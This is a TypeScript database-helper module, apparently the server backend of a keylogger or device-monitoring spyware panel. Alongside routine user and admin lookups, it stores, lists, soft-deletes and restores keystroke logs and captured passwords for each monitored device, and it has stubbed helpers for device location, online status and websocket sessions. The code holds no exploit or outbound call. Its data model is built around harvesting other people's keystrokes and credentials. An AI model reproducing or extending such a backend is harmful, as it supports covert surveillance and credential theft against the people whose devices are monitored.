import { eq, and } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { InsertUser, users, keylogs, InsertKeylog, passwords, InsertPassword } from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

export async function getAdminUser() {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get admin user: database not available");
    return undefined;
  }

  const admins = await db.select().from(users).where(eq(users.role, "admin")).limit(1);
  if (admins.length > 0) {
    return admins[0];
  }

  const anyUser = await db.select().from(users).limit(1);
  return anyUser.length > 0 ? anyUser[0] : undefined;
}

// Keylog helpers
export async function createKeylog(keylog: InsertKeylog): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot create keylog: database not available");
    return;
  }

  try {
    await db.insert(keylogs).values(keylog);
  } catch (error) {
    console.error("[Database] Failed to create keylog:", error);
    throw error;
  }
}

export async function getKeylogsByDevice(deviceId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get keylogs: database not available");
    return [];
  }

  try {
    const result = await db
      .select()
      .from(keylogs)
      .where(and(eq(keylogs.deviceId, deviceId), eq(keylogs.isDeleted, 0)))
      .orderBy(keylogs.createdAt);
    return result;
  } catch (error) {
    console.error("[Database] Failed to get keylogs:", error);
    return [];
  }
}

export async function deleteKeylog(keylogId: number): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot delete keylog: database not available");
    return;
  }

  try {
    await db
      .update(keylogs)
      .set({ isDeleted: 1 })
      .where(eq(keylogs.id, keylogId));
  } catch (error) {
    console.error("[Database] Failed to delete keylog:", error);
    throw error;
  }
}

export async function restoreKeylog(keylogId: number): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot restore keylog: database not available");
    return;
  }

  try {
    await db
      .update(keylogs)
      .set({ isDeleted: 0 })
      .where(eq(keylogs.id, keylogId));
  } catch (error) {
    console.error("[Database] Failed to restore keylog:", error);
    throw error;
  }
}

export async function getDeletedKeylogs(deviceId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get deleted keylogs: database not available");
    return [];
  }

  try {
    const result = await db
      .select()
      .from(keylogs)
      .where(and(eq(keylogs.deviceId, deviceId), eq(keylogs.isDeleted, 1)))
      .orderBy(keylogs.createdAt);
    return result;
  } catch (error) {
    console.error("[Database] Failed to get deleted keylogs:", error);
    return [];
  }
}

export async function deleteKeylogsByDevice(deviceId: string): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot delete keylogs by device: database not available");
    return;
  }

  try {
    await db.delete(keylogs).where(eq(keylogs.deviceId, deviceId));
  } catch (error) {
    console.error("[Database] Failed to delete keylogs by device:", error);
    throw error;
  }
}

// ✅ NOVO: Password helpers
export async function savePassword(password: InsertPassword): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot save password: database not available");
    return;
  }

  try {
    await db.insert(passwords).values(password);
  } catch (error) {
    console.error("[Database] Failed to save password:", error);
    throw error;
  }
}

export async function getPasswordsByDevice(deviceId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get passwords: database not available");
    return [];
  }

  try {
    const result = await db
      .select()
      .from(passwords)
      .where(and(eq(passwords.deviceId, deviceId), eq(passwords.isDeleted, 0)))
      .orderBy(passwords.createdAt);
    return result;
  } catch (error) {
    console.error("[Database] Failed to get passwords:", error);
    return [];
  }
}

export async function deletePassword(passwordId: number): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot delete password: database not available");
    return;
  }

  try {
    await db
      .update(passwords)
      .set({ isDeleted: 1 })
      .where(eq(passwords.id, passwordId));
  } catch (error) {
    console.error("[Database] Failed to delete password:", error);
    throw error;
  }
}

export async function restorePassword(passwordId: number): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot restore password: database not available");
    return;
  }

  try {
    await db
      .update(passwords)
      .set({ isDeleted: 0 })
      .where(eq(passwords.id, passwordId));
  } catch (error) {
    console.error("[Database] Failed to restore password:", error);
    throw error;
  }
}

export async function getDeletedPasswords(deviceId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get deleted passwords: database not available");
    return [];
  }

  try {
    const result = await db
      .select()
      .from(passwords)
      .where(and(eq(passwords.deviceId, deviceId), eq(passwords.isDeleted, 1)))
      .orderBy(passwords.createdAt);
    return result;
  } catch (error) {
    console.error("[Database] Failed to get deleted passwords:", error);
    return [];
  }
}

export async function getAlertConfigsByUserId(userId: number): Promise<any[]> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get alert configs: database not available");
    return [];
  }

  return [];
}

export async function createAlert(
  userId: number,
  deviceId: number,
  alertData: { alertType: string; title: string; message: string }
): Promise<any> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot create alert: database not available");
    return {
      id: 0,
      userId,
      deviceId,
      ...alertData,
      createdAt: new Date().toISOString(),
    };
  }

  return {
    id: 0,
    userId,
    deviceId,
    ...alertData,
    createdAt: new Date().toISOString(),
  };
}

export async function getDeviceById(deviceId: number): Promise<any | undefined> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get device: database not available");
    return undefined;
  }

  return {
    id: deviceId,
    deviceName: `Device ${deviceId}`,
    status: "online",
    lastSeen: new Date().toISOString(),
    lastLocation: { latitude: 0, longitude: 0 },
  };
}

export async function updateDeviceStatus(deviceId: number, status: "online" | "offline"): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot update device status: database not available");
    return;
  }
}

export async function deactivateWebsocketSession(sessionId: string): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot deactivate websocket session: database not available");
    return;
  }
}

export async function createWebsocketSession(userId: number, sessionId: string): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot create websocket session: database not available");
    return;
  }
}

export async function updateWebsocketSessionHeartbeat(sessionId: string): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot update websocket session heartbeat: database not available");
    return;
  }
}

// TODO: add feature queries here as your schema grows.
